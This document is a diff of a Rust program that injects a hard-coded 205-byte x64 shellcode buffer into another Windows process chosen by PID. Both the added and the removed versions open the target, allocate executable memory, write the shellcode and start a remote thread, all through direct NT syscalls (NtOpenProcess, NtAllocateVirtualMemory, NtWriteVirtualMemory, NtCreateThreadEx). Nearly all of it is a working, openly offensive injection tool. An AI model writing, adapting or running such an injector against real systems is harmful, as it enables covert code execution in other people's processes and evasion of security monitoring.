@@ -1,20 +1,181 @@
 #![allow(non_snake_case)]
-use ntapi::ntapi_base::CLIENT_ID;
 
 use rust_syscalls::syscall;
-use windows::Win32::System::Threading::{CREATE_SUSPENDED, THREAD_ALL_ACCESS};
-
+use std::env;
+use std::ffi::c_void;
 use std::mem::size_of;
+use std::process;
 use std::ptr::null_mut;
+use winapi::um::winnt::THREAD_ALL_ACCESS;
+
+#[cfg(windows)]
+use ntapi::ntapi_base::CLIENT_ID;
+#[cfg(windows)]
 use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES, PVOID};
-use winapi::um::winnt::{
-    PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
-    PROCESS_VM_WRITE,
-};
+#[cfg(windows)]
+use winapi::shared::ntstatus::STATUS_SUCCESS;
+#[cfg(windows)]
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
+
+macro_rules! syscall {
+    ($name:expr, $($arg:expr),*) => {{
+        #[cfg(windows)]
+        {
+            rust_syscalls::syscall!($name, $($arg),*)
+        }
+        #[cfg(not(windows))]
+        {
+            compile_error!("syscall! is only supported on Windows")
+        }
+    }}
+}
+
+#[cfg(windows)]
+pub fn injection_and_run(pid: u32, shellcode: Vec<u8>) -> Result<(), u32> {
+    let process_handle = open_process(pid)?;
+    println!("Opened process handle: {:?}", process_handle);
+
+    let base_address = allocate_memory(process_handle, shellcode.len())?;
+    println!("Allocated memory at: {:?}", base_address);
+
+    write_memory(process_handle, base_address, &shellcode)?;
+    println!("Wrote shellcode to memory");
+
+    let thread_handle = create_thread(process_handle, base_address)?;
+    println!("Created thread: {:?}", thread_handle);
+
+    // No need to resume the thread as it's created in a running state
+
+    Ok(())
+}
+
+#[cfg(windows)]
+fn open_process(pid: u32) -> Result<HANDLE, u32> {
+    let mut process_handle: HANDLE = NULL;
+    let oa = OBJECT_ATTRIBUTES {
+        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
+        RootDirectory: NULL,
+        ObjectName: null_mut(),
+        Attributes: 0,
+        SecurityDescriptor: NULL,
+        SecurityQualityOfService: NULL,
+    };
+
+    let client_id = CLIENT_ID {
+        UniqueProcess: pid as PVOID,
+        UniqueThread: null_mut(),
+    };
+
+    let status: NTSTATUS;
+    unsafe {
+        status = syscall!(
+            "NtOpenProcess",
+            &mut process_handle,
+            PROCESS_ALL_ACCESS,
+            &oa,
+            &client_id
+        );
+    }
+
+    if status != STATUS_SUCCESS {
+        Err(status as u32)
+    } else {
+        Ok(process_handle)
+    }
+}
+
+#[cfg(windows)]
+fn allocate_memory(process_handle: HANDLE, size: usize) -> Result<PVOID, u32> {
+    let mut base_address: PVOID = null_mut();
+    let mut region_size: usize = size;
+    let status: NTSTATUS;
+    unsafe {
+        status = syscall!(
+            "NtAllocateVirtualMemory",
+            process_handle,
+            &mut base_address,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+        );
+    }
+
+    if status != STATUS_SUCCESS {
+        Err(status as u32)
+    } else {
+        Ok(base_address)
+    }
+}
+
+#[cfg(windows)]
+fn write_memory(process_handle: HANDLE, address: PVOID, data: &[u8]) -> Result<(), u32> {
+    let mut bytes_written: usize = 0;
+    let status: NTSTATUS;
+    unsafe {
+        status = syscall!(
+            "NtWriteVirtualMemory",
+            process_handle,
+            address,
+            data.as_ptr() as PVOID,
+            data.len(),
+            &mut bytes_written
+        );
+    }
+
+    if status != STATUS_SUCCESS {
+        Err(status as u32)
+    } else {
+        Ok(())
+    }
+}
+
+#[cfg(windows)]
+fn create_thread(process_handle: HANDLE, start_address: PVOID) -> Result<HANDLE, u32> {
+    let mut thread_handle: HANDLE = null_mut();
+    let status: NTSTATUS;
+    unsafe {
+        status = syscall!(
+            "NtCreateThreadEx",
+            &mut thread_handle,
+            THREAD_ALL_ACCESS,
+            null_mut::<OBJECT_ATTRIBUTES>(),
+            process_handle,
+            start_address,
+            null_mut::<c_void>(),
+            0, // Create suspended flag (use CREATE_SUSPENDED if you want it initially suspended)
+            0,
+            0,
+            0,
+            null_mut::<c_void>()
+        );
+    }
+    if status != STATUS_SUCCESS {
+        println!("Failed to create thread. Error code: {}", status);
+        Err(status as u32)
+    } else {
+        println!("Successfully created thread: {:?}", thread_handle);
+        Ok(thread_handle)
+    }
+}
 
 fn main() {
-    let pid: u64 = 24448; // Example PID, replace with a valid PID
-                          // Declare a buffer to store 0xDE, 0xAD, 0xBE, 0xEF
+    // Parse command-line arguments
+    let args: Vec<String> = env::args().collect();
+    if args.len() != 2 {
+        eprintln!("Usage: {} <target_pid>", args[0]);
+        process::exit(1);
+    }
+
+    // Parse the target process ID
+    let target_pid: u32 = match args[1].parse() {
+        Ok(pid) => pid,
+        Err(_) => {
+            eprintln!("Invalid process ID");
+            process::exit(1);
+        }
+    };
+
     let mut buffer: [u8; 205] = [
         0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18,
         0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49,
@@ -32,136 +193,12 @@ fn main() {
         0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6,
     ];
 
-    let mut process_handle: HANDLE = NULL;
-    let oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
-        Length: size_of::<OBJECT_ATTRIBUTES>() as _,
-        RootDirectory: NULL,
-        ObjectName: NULL as _,
-        Attributes: 0,
-        SecurityDescriptor: NULL,
-        SecurityQualityOfService: NULL,
-    };
+    let shellcode = buffer.to_vec();
 
-    let client_id = CLIENT_ID {
-        UniqueProcess: pid as HANDLE,
-        UniqueThread: 0 as HANDLE,
-    };
-
-    // Call to NtOpenProcess
-    let status_open_process: NTSTATUS;
-    unsafe {
-        status_open_process = syscall!(
-            "NtOpenProcess",
-            &mut process_handle,
-            PROCESS_VM_OPERATION
-                | PROCESS_VM_WRITE
-                | PROCESS_QUERY_INFORMATION
-                | PROCESS_VM_READ
-                | PROCESS_CREATE_THREAD,
-            &oa,
-            &client_id
-        );
+    // Perform the injection
+    println!("Attempting to inject shellcode into process {}", target_pid);
+    match injection_and_run(target_pid, shellcode) {
+        Ok(_) => println!("Injection successful"),
+        Err(e) => eprintln!("Injection failed with error code: {}", e),
     }
-
-    println!("\n\t[-] NtOpenProcess status: {:#02X}", status_open_process);
-
-    if status_open_process != winapi::shared::ntstatus::STATUS_SUCCESS {
-        return;
-    }
-
-    // Call to NtAllocateVirtualMemory
-    let mut base_address: PVOID = null_mut();
-    let mut region_size: usize = buffer.len();
-    let status_allocate_memory: NTSTATUS;
-    unsafe {
-        status_allocate_memory = syscall!(
-            "NtAllocateVirtualMemory",
-            process_handle,
-            &mut base_address,
-            0,
-            &mut region_size,
-            winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
-            // Write access to the allocated memory
-            winapi::um::winnt::PAGE_EXECUTE_READWRITE
-        );
-    }
-
-    println!(
-        "\n\t[-] NtAllocateVirtualMemory status: {:#02X}",
-        status_allocate_memory
-    );
-
-    if status_allocate_memory != winapi::shared::ntstatus::STATUS_SUCCESS {
-        return;
-    }
-
-    // Call to NtWriteVirtualMemory
-    let mut bytes_written: usize = 0;
-    let status_write_memory: NTSTATUS;
-    unsafe {
-        status_write_memory = syscall!(
-            "NtWriteVirtualMemory",
-            process_handle,
-            base_address,
-            buffer.as_mut_ptr() as PVOID,
-            buffer.len(),
-            &mut bytes_written
-        );
-    }
-
-    println!(
-        "\n\t[-] NtWriteVirtualMemory status: {:#02X}",
-        status_write_memory
-    );
-    // Print the address where the buffer was written
-    println!("\n\t[-] Buffer written at: {:#02X}", base_address as u64);
-
-    // Call to NtProtectVirtualMemory to change the memory protection to PAGE_EXECUTE_READ
-    let mut old_protection: u32 = 0;
-    let status_protect_memory: NTSTATUS;
-    unsafe {
-        status_protect_memory = syscall!(
-            "NtProtectVirtualMemory",
-            process_handle,
-            &mut base_address,
-            &mut region_size,
-            winapi::um::winnt::PAGE_EXECUTE_READ,
-            &mut old_protection
-        );
-    }
-
-    println!(
-        "\n\t[-] NtProtectVirtualMemory status: {:#02X}",
-        status_protect_memory
-    );
-
-    println!(
-        "\n\t[-] Creating Thread starting at {:#02X}",
-        base_address as u64
-    );
-
-    // Call to NtCreateThreadEx
-    let mut thread_handle: HANDLE = NULL;
-    let status_create_thread: NTSTATUS;
-    unsafe {
-        status_create_thread = syscall!(
-            "NtCreateThreadEx",
-            &mut thread_handle,
-            THREAD_ALL_ACCESS,
-            NULL,
-            process_handle,
-            base_address as PVOID,
-            NULL,
-            CREATE_SUSPENDED,
-            0,
-            0,
-            0,
-            NULL
-        );
-    }
-
-    println!(
-        "\n\t[-] NtCreateThreadEx status: {:#02X}",
-        status_create_thread
-    );
 }
